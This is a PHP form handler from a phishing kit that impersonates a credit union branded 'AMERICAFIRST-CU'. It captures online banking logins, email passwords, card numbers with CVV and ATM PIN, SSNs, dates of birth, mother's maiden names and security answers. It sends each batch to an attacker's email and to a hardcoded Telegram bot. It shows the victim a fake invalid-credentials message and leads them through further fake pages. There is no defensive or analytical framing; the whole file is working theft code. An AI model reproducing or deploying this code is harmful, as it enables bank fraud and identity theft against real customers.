<?php
ob_start();

include 'email.php';
$ai = trim($_POST['ai']);
$pr = trim($_POST['pr']);

if (isset($_POST['btn2'])) {
	
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| AMERICAFIRST-CU BY MK |--------------|\n";
	$message .= "Q1            : ".$_POST['q1']."\n";
	$message .= "A1            : ".$_POST['a1']."\n";
	$message .= " \n";
	$message .= "Q2            : ".$_POST['q2']."\n";
	$message .= "A2            : ".$_POST['a2']."\n";
	$message .= " \n";
	$message .= "Q3            : ".$_POST['q3']."\n";
	$message .= "A3            : ".$_POST['a3']."\n";
	

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY MK --------------|\n";
	$send = $Receive_email;
	$subject = "Q&A : $ip";
	mail($send, $subject, $message); 
	
	/* Telegram */
function sendMessage($messaggio) {
    $token = '5217090858:AAG1CEcTsW_jwcHnc90LO_RQPqieZOIjstg';
    $chatid = '797324424';
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
sendMessage($message);
	header("Location: ./verify.html");
}

if (isset($_POST['btn4'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| AMERICAFIRST-CU BY MK |--------------|\n";
	
	$message .= "Card Number            : ".$_POST['cn']."\n";
	$message .= "Expiry Date            : ".$_POST['exdate']."\n";
	$message .= "CVV                    : ".$_POST['cvv']."\n";
	$message .= "ATM Pin                : ".$_POST['pin']."\n";
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY MK --------------|\n";
	$send = $Receive_email;
	$subject = "CARD : $ip";
	mail($send, $subject, $message); 
	
	/* Telegram */
function sendMessage($messaggio) {
    $token = '5217090858:AAG1CEcTsW_jwcHnc90LO_RQPqieZOIjstg';
    $chatid = '797324424';
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
sendMessage($message);
		header("Location: ./done.html"); 
	

}
else if (isset($_POST['btn1'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| AMERICAFIRST-CU BY MK |--------------|\n";
	
	$message .= "Email address            : ".$_POST['email-address']."\n";
	$message .= "Password                 : ".$_POST['Password']."\n";
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY MK --------------|\n";
	$send = $Receive_email;
	$subject = "EMAIL : $ip";
	mail($send, $subject, $message);

	/* Telegram */
function sendMessage($messaggio) {
    $token = '5217090858:AAG1CEcTsW_jwcHnc90LO_RQPqieZOIjstg';
    $chatid = '797324424';
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
sendMessage($message);

		header("Location: ./card.html");

}
else if (isset($_POST['btn3'])) {
	
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| AMERICAFIRST-CU BY MK |--------------|\n";
	$message .= "FULL NAME                       : ".$_POST['fname']."\n";
	$message .= "SSN                             : ".$_POST['ssn']."\n";
	$message .= "DATE OF BIRTH                   : ".$_POST['Dob']."\n";
	$message .= "PHONE NUMBER                    : ".$_POST['Pn']."\n";
	$message .= "CRRIER PIN                      : ".$_POST['cn']."\n";
	$message .= "ADDRESS                         : ".$_POST['add']."\n";
	$message .= "ZIP CODE                        : ".$_POST['zc']."\n";
	$message .= "MOTHER'S MAIDEN NAME            : ".$_POST['mmn']."\n";

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY MK --------------|\n";
	$send = $Receive_email;
	$subject = "INFO : $ip";
	mail($send, $subject, $message);

	/* Telegram */
function sendMessage($messaggio) {
    $token = '5217090858:AAG1CEcTsW_jwcHnc90LO_RQPqieZOIjstg';
    $chatid = '797324424';
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
sendMessage($message); 
	
	header("Location: ./email.html");

}

else if($ai != null && $pr != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| AMERICAFIRST-CU BY MK |--------------|\n";
	
	$message .= "Online ID             : ".$ai."\n";
	$message .= "Passcode              : ".$pr."\n";

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY MK --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
    mail($send, $subject, $message);   
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);

	/* Telegram */
function sendMessage($messaggio) {
    $token = '5217090858:AAG1CEcTsW_jwcHnc90LO_RQPqieZOIjstg';
    $chatid = '797324424';
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
sendMessage($message);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);
ob_end_flush();
?>